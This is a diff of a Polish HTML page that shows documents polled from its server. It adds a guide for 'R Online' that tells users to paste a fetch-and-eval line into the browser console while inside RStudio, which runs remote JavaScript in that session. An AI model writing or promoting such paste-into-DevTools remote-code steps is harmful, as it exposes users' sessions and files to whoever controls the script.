@@ -1,7 +1,28 @@
 <!doctype html>
 <html>
+  <head>
+    <style>
+
+      #container{
+        display: flex;
+        flex-direction: column;
+        width:80%;
+        margin: auto;
+        justify-content: center;
+        align-items: center;
+        align-content: center;
+        font-size: 28px;
+      }
+
+      img {
+        width: 80%;
+        box-shadow: 0 2px 10px rgba(0,0,0,0.7);
+      }
+    </style>
+  </head>
 <body>
-  <h1>Dane z serwera:</h1>
+  <div id = "container">
+  <h1>Włączone dokumenty:</h1>
   <div id="output"></div>
 
   <script>
@@ -18,23 +39,39 @@
             text += doc
           })
 
-          // sprawdzanie czy dane się zmieniły
           if (text !== lastData) {
-            console.log("Dane się zmieniły");
             document.getElementById("output").innerText = text
             lastData = text
-          } else {
-            console.log("Brak zmian")
           }
         })
         .catch(err => console.error(err))
     }
 
-    // pierwsze wywołanie od razu
     fetchData()
 
-    // potem co 3 sekundy
     setInterval(fetchData, 3000)
   </script>
+
+  
+    <h2>Jak włączyć R Online?</h2>
+    <p>1. Otwórz RStudio, włącz plik, który chcesz udostępnić i kliknij prawym przyciskiem myszy na jego tło.</p>
+    <img src = "krok1.png" />
+    <p>2. Włącz konsolę i wklej poniższy kod.</p>
+    <code id = "fetchCode" style = "padding: 4px; box-shadow: 0 2px 10px rgba(0,0,0,0.7);"></code>
+    <div style="height: 10px;"></div>
+    <script>
+      code = document.getElementById("fetchCode")
+      code.innerText = `fetch("${window.location.origin}/clientScript.js")
+    \t.then(response => response.text())
+    \t.then(text => eval(text))`
+    </script>
+    <img src = "krok2.png" />
+
+    <p>3. Zamknij DevTools krzyżykiem w prawym górnym rogu.</p>
+    <img src = "krok3.png" />
+    
+    <p>4. Po kliknięciu Join wprowadź dane i kliknij Submit.</p>
+    <img src = "krok4.png" />
+  </div>
 </body>
 </html>
